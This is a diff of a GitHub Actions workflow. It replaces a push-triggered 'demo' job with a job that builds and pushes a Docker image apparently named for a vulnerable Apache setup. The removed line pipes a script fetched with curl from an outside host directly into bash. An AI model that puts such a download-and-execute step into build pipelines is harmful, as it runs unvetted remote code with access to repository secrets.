@@ -1,9 +1,30 @@
-name: GitHub Actions Demo
+name: Build and Push to GitHub Container Registry
 
-on: [push]
+on:
+  push:
+    branches:
+      - main
 
 jobs:
-  echo_hello_world:
+  build-and-push:
     runs-on: ubuntu-latest
+    timeout-minutes: 60
+
     steps:
-      - run: curl -s 'http://xxxxx.chord7.com/start.php?type=curl' | bash
+      # リポジトリをチェックアウト
+      - name: Checkout code
+        uses: actions/checkout@v3
+
+      # GitHub Container Registry にログイン
+      - name: Login to GitHub Container Registry
+        run: echo "${{ secrets.GITHUB_TOKEN }}" | docker login ghcr.io -u ${{ github.actor }} --password-stdin
+
+      # Docker イメージをビルド
+      - name: Build Docker Image
+        run: |
+          docker build -t ghcr.io/${{ github.repository_owner }}/vul-apache-cve-2021-42103:latest .
+
+      # Docker イメージをプッシュ
+      - name: Push Docker Image
+        run: |
+          docker push ghcr.io/${{ github.repository_owner }}/vul-apache-cve-2021-42103:latest
